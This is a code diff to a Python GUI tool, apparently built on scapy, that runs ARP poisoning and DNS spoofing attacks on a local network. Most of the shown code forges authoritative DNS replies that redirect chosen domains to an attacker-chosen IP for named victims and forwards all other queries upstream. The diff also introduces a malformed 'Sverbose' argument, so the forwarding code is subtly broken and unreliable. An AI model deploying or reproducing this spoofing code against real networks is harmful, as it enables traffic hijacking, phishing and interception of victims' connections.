@@ -70,36 +70,28 @@ class Application(Frame):
         Label(self, text = "IP Victims:      ").grid(row = 2, column = 4)
         Label(self, text = "Sites to spoof:  ").grid(row = 6, column = 4)
         Label(self, text = "Redirect IPs to: ").grid(row = 10, column = 4)
-        Label(self, text = "DNS server:      ").grid(row = 14, column = 4)
+        Label(self, text = "Gateway:         ").grid(row = 14, column = 4)
 
         # Configure field victim's ip for arp attack
         self.uArpEntryIpVictim = Entry(self)
-        self.uArpEntryIpVictim.insert(END, "192.168.56.101")
-        #self.uArpEntryIpVictim.bind("<Key>", self.click)
         self.uArpEntryIpVictim.grid(row = 2, column = 1)
 
         # Configure field server ip for arp attack
         self.uArpEntryIpServer = Entry(self)
-        self.uArpEntryIpServer.insert(END, "192.168.56.102")
-        #self.uArpEntryIpServer.bind("<Key>", self.click)
         self.uArpEntryIpServer.grid(row = 6, column = 1)
 
 
         # Configure field victim's ip for DNS attack
         self.uDnsEntryIpVictim = Entry(self)
-        self.uDnsEntryIpVictim.insert(END, "10.0.2.5")
         self.uDnsEntryIpVictim.grid(row = 2, column = 5)
 
         self.uDnsEntryDomains = Entry(self)
-        self.uDnsEntryDomains.insert(END, "facebook.com")
         self.uDnsEntryDomains.grid(row = 6, column = 5)
 
         self.uDnsEntryIpRedirect = Entry(self)
-        self.uDnsEntryIpRedirect.insert(END, "10.0.2.6")
         self.uDnsEntryIpRedirect.grid(row = 10, column = 5)
 
         self.uDnsEntryIpDNS = Entry(self)
-        self.uDnsEntryIpDNS.insert(END, "10.0.2.1")
         self.uDnsEntryIpDNS.grid(row = 14, column = 5)
         
         
@@ -107,7 +99,6 @@ class Application(Frame):
         self.interceptedPackets = []
         self.networkInterface = "enp0s8"
         self.selfMac = get_if_hwaddr(self.networkInterface)
-        self.selfIp = "192.168.56.103"
         
     def startArp(self):
         self.arp['state'] = 'disabled'
@@ -184,7 +175,10 @@ class Application(Frame):
             
             def forward(pkt):
                 print "[DNS] Forwarding: " + pkt[DNSQR].qname
-                resp = sr1(IP(dst = '8.8.8.8')/UDP(sport = pkt[UDP].sport)/DNS(rd = 1, id = pkt[DNS].id, qd = DNSQR(qname = pkt[DNSQR].qname)), verbose = False)
+                resp = sr1(IP(dst = '8.8.8.8')/
+                           UDP(sport = pkt[UDP].sport)/
+                           DNS(rd = 1, id = pkt[DNS].id, qd = DNSQR(qname = pkt[DNSQR].qname)),
+                           Sverbose = False)
                 resp_pkt = IP(dst = pkt[IP].src, src = dnsserver[0])/UDP(dport = pkt[UDP].sport)/DNS()
                 resp_pkt[DNS] = resp[DNS]
                 send(resp_pkt, verbose = 0, iface = self.networkInterface)
@@ -193,14 +187,13 @@ class Application(Frame):
             def get(pkt):
                 if (DNS in pkt and pkt[DNS].opcode == 0 and pkt[DNS].ancount == 0):
                     for i in range (0, len(sites)):
-                        site = sites[i]
                         if pkt[DNSQR].qname[len(pkt[DNSQR].qname) - 1] == ".":
-                            pkt["DNS Question Record"].qname = pkt["DNS Question Record"].qname[0 : len(pkt["DNS Question Record"].qname) - 1]
-                        if str(pkt["DNS Question Record"].qname) in site:
-                            redirect = self.dnsIpRedirects[i] if len(self.dnsIpRedirects) < i else self.dnsIpRedirects[0]
-                            resp_pkt = IP(dst=pkt[IP].src, src = pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, aa=1, qr=1, an = DNSRR(rrname=pkt[DNS].qd.qname, ttl = 100, rdata=redirect))
+                            pkt[DNSQR].qname = pkt[DNSQR].qname[0 : len(pkt[DNSQR].qname) - 1]
+                        if str(pkt[DNSQR].qname) in sites[i]:
+                            redirect = self.dnsIpRedirects[i]
+                            resp_pkt = IP(dst=pkt[IP].src, src = pkt[IP].dst)/UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/DNS(id = pkt[DNS].id, qd = pkt[DNS].qd, aa=1, qr=1, an = DNSRR(rrname=pkt[DNS].qd.qname, ttl = 100, rdata = redirect))
                             send(resp_pkt, verbose = False, iface = self.networkInterface)
-                            return "[DNS] Spoofed DNS response sent - redirected " + site + " to " + redirect + " for client: " + pkt[IP].src
+                            return "[DNS] Spoofed DNS response sent - redirected " + sites[i] + " to " + redirect + " for client: " + pkt[IP].src
                     return forward(pkt)
             return get
 
